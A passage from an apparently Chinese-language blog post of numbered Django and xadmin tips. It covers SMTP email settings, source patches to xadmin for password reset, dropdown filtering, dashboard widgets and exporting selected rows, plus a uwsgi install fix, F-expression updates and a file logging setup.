class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># ------------------------邮箱配置-----------------------------------------</span><br><span class="line">EMAIL_BACKEND = &#x27;django.core.mail.backends.smtp.EmailBackend&#x27; #把要发送的邮件显示再控制台上，方便调试</span><br><span class="line">EMAIL_USE_SSL = True</span><br><span class="line">EMAIL_HOST = &#x27;smtp.qq.com&#x27;  # 如果是 163 改成 smtp.163.com</span><br><span class="line">EMAIL_PORT = 465</span><br><span class="line">EMAIL_HOST_USER = &#x27;邮箱账号&#x27; # 帐号</span><br><span class="line">EMAIL_HOST_PASSWORD = &#x27;授权码&#x27;  # 到邮箱里开通</span><br><span class="line">DEFAULT_FROM_EMAIL = EMAIL_HOST_USER</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于django2与xadmin有些地方不兼容，需要修改源码：</p><p>找到虚拟环境根目录\Lib\site-packages\xadmin\plugins\passwords.py</p><p>在passwords.py文件中大概79行，修改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">return password_reset_confirm(request=request, uidb36=uidb36, token=token,</span><br><span class="line">                                      template_name=self.password_reset_confirm_template,</span><br><span class="line">                                      token_generator=self.password_reset_token_generator,</span><br><span class="line">                                      set_password_form=self.password_reset_set_form,</span><br><span class="line">                                      post_reset_redirect=self.get_admin_url(&#x27;xadmin_password_reset_complete&#x27;),</span><br><span class="line">                                      current_app=self.admin_site.name, extra_context=context).dispatch(request=request,</span><br><span class="line">                                                                                                        uidb64=uidb36,token=token)</span><br><span class="line">             </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>找到虚拟环境根目录Lib\site-packages\django\contrib\auth\views.py</p><p>在views.py文件中大概258行，增加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 成功后跳转路由,根据自己实际来定</span><br><span class="line">self.success_url = self.request.build_absolute_uri(&#x27;/&#x27;) + &#x27;xadmin/&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020052620533440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="63、xadmin外键下拉框添加过滤"><a href="#63、xadmin外键下拉框添加过滤" class="headerlink" title="63、xadmin外键下拉框添加过滤"></a>63、xadmin外键下拉框添加过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class MallGoodsAdmin(object):</span><br><span class="line">    &quot;&quot;&quot;商品管理&quot;&quot;&quot;</span><br><span class="line">    list_display = [&#x27;id&#x27;, &#x27;show_photo&#x27;, &#x27;nickname&#x27;, &#x27;merchant&#x27;, &#x27;goods_class&#x27;, &#x27;label&#x27;,]</span><br><span class="line">    search_fields = [&#x27;nickname&#x27;]</span><br><span class="line">    list_filter = [&#x27;goods_class&#x27;, &#x27;label&#x27;,]</span><br><span class="line">    model_icon = &#x27;fa fa-bars&#x27;</span><br><span class="line">    list_editable = [&#x27;goods_class&#x27;, ]</span><br><span class="line">    #,重写虚拟环境根目录下\Lib\site-packages\xadmin\views\edit.py中的formfield_for_dbfield</span><br><span class="line">    def formfield_for_dbfield(self, db_field, **kwargs):</span><br><span class="line">        # 对MallGoodsClass这个表项的下拉框选择进行过滤</span><br><span class="line">        # MallGoods中有一个goods_class商品分类外键MallGoodsClass，过滤掉外键MallGoodsClass中 </span><br><span class="line">        # master_class为空的值</span><br><span class="line">        if db_field.name == &quot;goods_class&quot;:</span><br><span class="line">            kwargs[&quot;queryset&quot;] = MallGoodsClass.objects.filter(master_class__isnull=False)</span><br><span class="line">            # 对assigned_recipient这个表项的下拉选择进行过滤</span><br><span class="line">        return db_field.formfield(**dict(**kwargs))</span><br><span class="line">        return super().formfield_for_dbfield(db_field, **kwargs)</span><br><span class="line"></span><br><span class="line">xadmin.site.register(models.MallGoods, MallGoodsAdmin)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="64、xadmin即时编辑器去掉空标签"><a href="#64、xadmin即时编辑器去掉空标签" class="headerlink" title="64、xadmin即时编辑器去掉空标签"></a>64、xadmin即时编辑器去掉空标签</h2><p><img src="https://img-blog.csdnimg.cn/20190716151440115.png" alt="在这里插入图片描述"></p><p>虚拟环境根目录下\Lib\site-packages\xadmin\plugins\editable.py，在大概</p><p>129行增加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">form.fields[fields[0]].empty_label = None</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190716151459680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="65、用户增加的小组件，让其他用户可见"><a href="#65、用户增加的小组件，让其他用户可见" class="headerlink" title="65、用户增加的小组件，让其他用户可见"></a>65、用户增加的小组件，让其他用户可见</h2><p>找到虚拟环境根目录\Lib\site-packages\xadmin\views\dashboard.py</p><p>在548行、554行</p><p><img src="https://img-blog.csdnimg.cn/20190723175537371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">@filter_hook</span><br><span class="line">    def get_widgets(self):</span><br><span class="line"></span><br><span class="line">        if self.widget_customiz:</span><br><span class="line">            portal_pos = UserSettings.objects.filter(</span><br><span class="line">               key=self.get_portal_key())</span><br><span class="line">            if len(portal_pos):</span><br><span class="line">                portal_pos = portal_pos[0].value</span><br><span class="line">                widgets = []</span><br><span class="line"></span><br><span class="line">                if portal_pos:</span><br><span class="line">                    user_widgets = dict([(uw.id, uw) for uw in UserWidget.objects.filter(page_id=self.get_page_id())])</span><br><span class="line">                    for col in portal_pos.split(&#x27;|&#x27;):</span><br><span class="line">                        ws = []</span><br><span class="line">                        for wid in col.split(&#x27;,&#x27;):</span><br><span class="line">                            try:</span><br><span class="line">                                widget = user_widgets.get(int(wid))</span><br><span class="line">                                if widget:</span><br><span class="line">                                    ws.append(self.get_widget(widget))</span><br><span class="line">                            except Exception as e:</span><br><span class="line">                                import logging</span><br><span class="line">                                logging.error(e, exc_info=True)</span><br><span class="line">                        widgets.append(ws)</span><br><span class="line"></span><br><span class="line">                return widgets</span><br><span class="line"></span><br><span class="line">        return self.get_init_widget()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="66、pip-install-uwsgi出错"><a href="#66、pip-install-uwsgi出错" class="headerlink" title="66、pip install uwsgi出错"></a>66、pip install uwsgi出错</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plugins/python/uwsgi_python.h:2:20: fatal error: Python.h: No such file or directory</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先安装python3环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install python3-dev</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后再虚拟环境中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install uwsgi</span><br></pre></td></tr></table></figure><h2 id="66、xadmin后台加载数据慢，解决方案"><a href="#66、xadmin后台加载数据慢，解决方案" class="headerlink" title="66、xadmin后台加载数据慢，解决方案"></a>66、xadmin后台加载数据慢，解决方案</h2><p>list_filter: 过滤器要慎用，不要使用类似id这些数据量大的字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class MallUserAdmin(object):</span><br><span class="line">    &quot;&quot;&quot;用户管理&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    list_display = [&#x27;id&#x27;, &#x27;tp_icon&#x27;, &#x27;nickname&#x27;, &#x27;phone&#x27;, &#x27;level&#x27;, &#x27;balance&#x27;, &#x27;province&#x27;, &#x27;city&#x27;, &#x27;quxian&#x27;]  # 显示字段</span><br><span class="line">    search_fields = [&#x27;id&#x27;, &#x27;nickname&#x27;, &#x27;phone&#x27;]  # 搜索</span><br><span class="line">    list_filter = [&#x27;level&#x27;, &#x27;province&#x27;, &#x27;city&#x27;, &#x27;quxian&#x27;]  # 过滤器</span><br><span class="line">    # list_filter = [&#x27;id&#x27;, &#x27;level&#x27;, &#x27;province&#x27;, &#x27;city&#x27;, &#x27;quxian&#x27;]  # 如果加id，xadmin加载回来的数据就会很慢，所以不要在过滤器上使用id</span><br><span class="line">    list_per_page = 30  # 默认每页数量</span><br><span class="line">    model_icon = &#x27;fa fa-users&#x27;  # 左侧图标</span><br><span class="line">    ordering = [&#x27;-id&#x27;]  # 排序</span><br><span class="line">    readonly_fields = [&#x27;subscribe&#x27;, &#x27;wx_openid&#x27;, &#x27;phone&#x27;]  # 只读字段</span><br><span class="line">    is_addbalance = True   # 加载自定义的插件</span><br><span class="line">    relfield_style = &#x27;fk-ajax&#x27;  # 其他表如果外键到用户表就做ajax搜索查询，不一次性加载数据</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="67-、xadmin导出插件处理，增加导出勾选数据项"><a href="#67-、xadmin导出插件处理，增加导出勾选数据项" class="headerlink" title="67 、xadmin导出插件处理，增加导出勾选数据项"></a>67 、xadmin导出插件处理，增加导出勾选数据项</h2><p>常规的导出只有两个选择【导出表头】、【导出全部数据】</p><p><img src="https://img-blog.csdnimg.cn/20190917141511283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>现在想要做的是增加一个选择，即【导出表头】、【导出全部数据】、【导出勾选数据】，如下图：</p><p><img src="https://img-blog.csdnimg.cn/20190917141839822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>需要修改xadmin源代码，具体如下</p><h4 id="1、加载js文件"><a href="#1、加载js文件" class="headerlink" title="1、加载js文件"></a>1、加载js文件</h4><p>找到虚拟环境\Lib\site-packages\xadmin\views\list.py，在607行增加’xadmin.plugin.importexport.js’，如下图所示</p><p><img src="https://img-blog.csdnimg.cn/20190917141853832.png" alt="在这里插入图片描述"></p><h4 id="2、修改export-py，后端处理下载文件"><a href="#2、修改export-py，后端处理下载文件" class="headerlink" title="2、修改export.py，后端处理下载文件"></a>2、修改export.py，后端处理下载文件</h4><p>找到虚拟环境\Lib\site-packages\xadmin\plugins\export.py</p><p>在84行把rows &#x3D; context[‘results’]修改成如下函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 新增导出所选数据</span><br><span class="line"># rows = context[&#x27;results&#x27;]  </span><br><span class="line">rows = []</span><br><span class="line">select_across = self.request.GET.get(&#x27;_select_across&#x27;, False) == &#x27;1&#x27;</span><br><span class="line">selected = self.request.GET.get(&#x27;_selected_actions&#x27;, &#x27;&#x27;)</span><br><span class="line">if self.request.GET.get(&#x27;selected&#x27;, &#x27;off&#x27;) == &#x27;on&#x27;:</span><br><span class="line">    if not select_across:</span><br><span class="line">        selected_pk = selected.split(&#x27;,&#x27;)</span><br><span class="line">        for i in context[&#x27;results&#x27;]:</span><br><span class="line">            if str(i[&#x27;object&#x27;].id) in selected_pk:</span><br><span class="line">                rows.append(i)</span><br><span class="line">    else:</span><br><span class="line">        rows = context[&#x27;results&#x27;]</span><br><span class="line">else:</span><br><span class="line">    rows = context[&#x27;results&#x27;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2019091714200418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3、 修改model_list.top_toolbar.exports.html<br>找到虚拟环境\Lib\site-packages\xadmin\templates\xadmin\blocks\model_list.top_toolbar.exports.html</p><p>使用以下代码覆盖原文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load i18n %&#125;</span><br><span class="line">&lt;div class=&quot;btn-group export&quot;&gt;</span><br><span class="line">    &lt;a id=&quot;export-menu&quot; class=&quot;dropdown-toggle btn btn-default btn-sm&quot; data-toggle=&quot;dropdown&quot; href=&quot;#&quot;&gt;</span><br><span class="line">        &lt;i class=&quot;fa fa-share&quot;&gt;&lt;/i&gt; &#123;% trans &quot;Export&quot; %&#125; &lt;span class=&quot;caret&quot;&gt;&lt;/span&gt;</span><br><span class="line">    &lt;/a&gt;</span><br><span class="line">    &lt;ul class=&quot;dropdown-menu&quot; role=&quot;menu&quot; aria-labelledby=&quot;dLabel&quot;&gt;</span><br><span class="line">        &#123;% for et in export_types %&#125;</span><br><span class="line">        &lt;li&gt;&lt;a data-toggle=&quot;modal&quot; data-target=&quot;#export-modal-&#123;&#123;et.type&#125;&#125;&quot;&gt;&lt;i class=&quot;fa fa-arrow-circle-down&quot;&gt;</span><br><span class="line">        &lt;/i&gt; &#123;% trans &quot;Export&quot; %&#125; &#123;&#123;et.name&#125;&#125;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">    &#123;% for et in export_types %&#125;</span><br><span class="line">    &lt;div id=&quot;export-modal-&#123;&#123;et.type&#125;&#125;&quot; class=&quot;modal fade&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;modal-dialog&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;modal-content&quot;&gt;</span><br><span class="line">                &lt;form method=&quot;get&quot; action=&quot;&quot;&gt;</span><br><span class="line"></span><br><span class="line">                    &lt;div class=&quot;modal-header&quot;&gt;</span><br><span class="line">                        &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;modal&quot; aria-hidden=&quot;true&quot;&gt;&amp;times;&lt;/button&gt;</span><br><span class="line">                        &lt;h4 class=&quot;modal-title&quot;&gt;&#123;% trans &quot;Export&quot; %&#125; &#123;&#123;et.name&#125;&#125;&lt;/h4&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div class=&quot;modal-body&quot;&gt;</span><br><span class="line">                        &#123;&#123; form_params|safe &#125;&#125;</span><br><span class="line">                        &lt;input type=&quot;hidden&quot; name=&quot;export_type&quot; value=&quot;&#123;&#123;et.type&#125;&#125;&quot;&gt;</span><br><span class="line">                        &lt;!-- 增加 导出所选数据 一栏 --&gt;</span><br><span class="line">                        &lt;input type=&quot;hidden&quot; name=&quot;_selected_actions&quot; value=&quot;&quot;/&gt;</span><br><span class="line">                        &lt;input type=&quot;hidden&quot; name=&quot;_select_across&quot; value=&quot;&quot;/&gt;</span><br><span class="line"></span><br><span class="line">                        &lt;label class=&quot;checkbox&quot;&gt;</span><br><span class="line">                            &#123;% if et.type == &quot;xlsx&quot; %&#125;</span><br><span class="line">                            &lt;input type=&quot;checkbox&quot; name=&quot;export_xlsx_header&quot; checked=&quot;checked&quot; value=&quot;on&quot;&gt;</span><br><span class="line">                            &#123;% trans &quot;Export with table header.&quot; %&#125;</span><br><span class="line">                            &#123;% endif %&#125;</span><br><span class="line">                            &#123;% if et.type == &quot;xls&quot; %&#125;</span><br><span class="line">                            &lt;input type=&quot;checkbox&quot; name=&quot;export_xls_header&quot; checked=&quot;checked&quot; value=&quot;on&quot;&gt;</span><br><span class="line">                            &#123;% trans &quot;Export with table header.&quot; %&#125;</span><br><span class="line">                            &#123;% endif %&#125;</span><br><span class="line">                            &#123;% if et.type == &quot;csv&quot; %&#125;</span><br><span class="line">                            &lt;input type=&quot;checkbox&quot; name=&quot;export_csv_header&quot; checked=&quot;checked&quot; value=&quot;on&quot;&gt;</span><br><span class="line">                            &#123;% trans &quot;Export with table header.&quot; %&#125;</span><br><span class="line">                            &#123;% endif %&#125;</span><br><span class="line">                            &#123;% if et.type == &quot;xml&quot; %&#125;</span><br><span class="line">                            &lt;input type=&quot;checkbox&quot; name=&quot;export_xml_format&quot; checked=&quot;checked&quot; value=&quot;on&quot;&gt;</span><br><span class="line">                            &#123;% trans &quot;Export with format.&quot; %&#125;</span><br><span class="line">                            &#123;% endif %&#125;</span><br><span class="line">                            &#123;% if et.type == &quot;json&quot; %&#125;</span><br><span class="line">                            &lt;input type=&quot;checkbox&quot; name=&quot;export_json_format&quot; checked=&quot;checked&quot; value=&quot;on&quot;&gt;</span><br><span class="line">                            &#123;% trans &quot;Export with format.&quot; %&#125;</span><br><span class="line">                            &#123;% endif %&#125;</span><br><span class="line">                        &lt;/label&gt;</span><br><span class="line">                        &lt;label class=&quot;checkbox&quot;&gt;</span><br><span class="line">                            &lt;input type=&quot;checkbox&quot; name=&quot;all&quot; value=&quot;on&quot;&gt; &#123;% trans &quot;Export all data.&quot; %&#125;</span><br><span class="line">                        &lt;/label&gt;</span><br><span class="line">                        &lt;!-- 增加 导出所选数据 一栏 --&gt;</span><br><span class="line">                        &lt;label class=&quot;checkbox&quot;&gt;</span><br><span class="line">                            &lt;input type=&quot;checkbox&quot; name=&quot;selected&quot; value=&quot;on&quot;&gt; 导出勾选数据</span><br><span class="line">                        &lt;/label&gt;</span><br><span class="line"></span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div class=&quot;modal-footer&quot;&gt;</span><br><span class="line">                        &lt;button type=&quot;button&quot; class=&quot;btn btn-default&quot; data-dismiss=&quot;modal&quot;&gt;&#123;% trans &quot;Close&quot; %&#125;&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">                        &lt;button class=&quot;btn btn-success myexport  glyphicon glyphicon-export &quot; type=&quot;submit&quot;&gt;&lt;i</span><br><span class="line">                                class=&quot;fa fa-share&quot;&gt;&lt;/i&gt; &#123;% trans &quot;Export&quot; %&#125;</span><br><span class="line">                        &lt;/button&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">            &lt;/div&gt;&lt;!-- /.modal-content --&gt;</span><br><span class="line">        &lt;/div&gt;&lt;!-- /.modal-dalog --&gt;</span><br><span class="line">    &lt;/div&gt;&lt;!-- /.modal --&gt;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    // 如果是订单导出，把待出货订单设置成待收货订单</span><br><span class="line">    $(document).ready(function () &#123;</span><br><span class="line">        $(&#x27;.myexport&#x27;).click(function () &#123;</span><br><span class="line">            // 当把订单导出时，需要修改订单状态为待收货状态</span><br><span class="line">            var url = window.location.protocol + &#x27;//&#x27; + window.location.host + &quot;/exportorder/&quot;;</span><br><span class="line">            $(&quot;input[name=&#x27;_select_across&#x27;]&quot;).val($(&quot;input[name=&#x27;select_across&#x27;]&quot;).val());</span><br><span class="line">            if ($(&quot;input[name=&#x27;selected&#x27;]&quot;).is(&#x27;:checked&#x27;)) &#123;</span><br><span class="line">                var arr = [];</span><br><span class="line">                $.each($(&#x27;.action-select&#x27;), function () &#123;</span><br><span class="line">                    if (true == $(this).prop(&#x27;checked&#x27;)) &#123;</span><br><span class="line">                        arr.push($(this).val());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">                if(arr.length == 0)&#123;</span><br><span class="line">                    alert(&#x27;请先勾选导出数据&#x27;)</span><br><span class="line">                    return false</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                var arr = []</span><br><span class="line">                var order_type = $(&#x27;.breadcrumb li&#x27;).eq(1).text().trim()</span><br><span class="line">                $(&#x27;.grid-item&#x27;).each(function (index, el) &#123;</span><br><span class="line"></span><br><span class="line">                    arr.push($(el).find(&#x27;td&#x27;).eq(1).text().trim())</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">            if (($(&#x27;.breadcrumb &gt; li&#x27;).eq(1).text()).indexOf(&#x27;订单&#x27;) != -1) &#123;</span><br><span class="line">                // 5秒后执行</span><br><span class="line">                setTimeout(function () &#123;</span><br><span class="line">                    $.ajax(&#123;</span><br><span class="line">                        type: &quot;POST&quot;,</span><br><span class="line">                        url: url,</span><br><span class="line">                        data: &#123;&#x27;orderlist&#x27;: JSON.stringify(arr), &#x27;order_type&#x27;: order_type,&#125;,</span><br><span class="line">                        beforeSend: function (xhr) &#123;</span><br><span class="line">                            xhr.setRequestHeader(&quot;X-CSRFToken&quot;, $.getCookie(&quot;csrftoken&quot;))</span><br><span class="line">                        &#125;,</span><br><span class="line">                        success: function (data) &#123;</span><br><span class="line">                            window.location.reload();</span><br><span class="line">                        &#125;,</span><br><span class="line">                        error: function (xhr) &#123;</span><br><span class="line">                            alert(&quot;出现未知错误&quot;);</span><br><span class="line">                            window.location.reload();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;, 5000);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="68、使用F查询更新用户重要数据"><a href="#68、使用F查询更新用户重要数据" class="headerlink" title="68、使用F查询更新用户重要数据"></a>68、使用F查询更新用户重要数据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from django.db.models import F</span><br><span class="line"># 使用F查询更新用户余额</span><br><span class="line">balance = 5  </span><br><span class="line">MallUser.objects.filter(id=1).update(balance=F(&#x27;balance&#x27;) + balance)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相当于sql的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update Malluser set balance=balance + 5 where id=1;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="69、日志输出模块"><a href="#69、日志输出模块" class="headerlink" title="69、日志输出模块"></a>69、日志输出模块</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import logging</span><br><span class="line">import platform</span><br><span class="line"># 全局函数</span><br><span class="line">PlATFORM = platform.system()</span><br><span class="line">if (PlATFORM == &quot;Linux&quot;):</span><br><span class="line">    # linux系统,文件保存在var下</span><br><span class="line">    SERVER_LOG_PATH = &#x27;/var/mylog.log&#x27;</span><br><span class="line">else:</span><br><span class="line">    # windows系统,文件保存在D盘下</span><br><span class="line">    SERVER_LOG_PATH = &#x27;D:\mylog.log&#x27;</span><br><span class="line"># 定义一个logging的对象，命名为mylog</span><br><span class="line">LOGGER = logging.getLogger(&#x27;mylog&#x27;)</span><br><span class="line"># 设置级别为WARNING</span><br><span class="line">LOGGER.setLevel(logging.WARNING)</span><br><span class="line"># 创建一个handler，用于写入日志文件</span><br><span class="line">fh = logging.FileHandler(SERVER_LOG_PATH, encoding=&#x27;utf-8&#x27;)</span><br><span class="line">fh.setLevel(logging.WARNING)</span><br><span class="line"># 定义handler的输出格式</span><br><span class="line">formatter = logging.Formatter(&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;, datefmt=&#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class="line">fh.setFormatter(formatter)</span><br><span class="line"># 给Logger添加handler</span><br><span class="line">LOGGER.addHandler(fh)</span><br><span class="line"># 不在控制台显示</span><br><span class="line">LOGGER.propagate 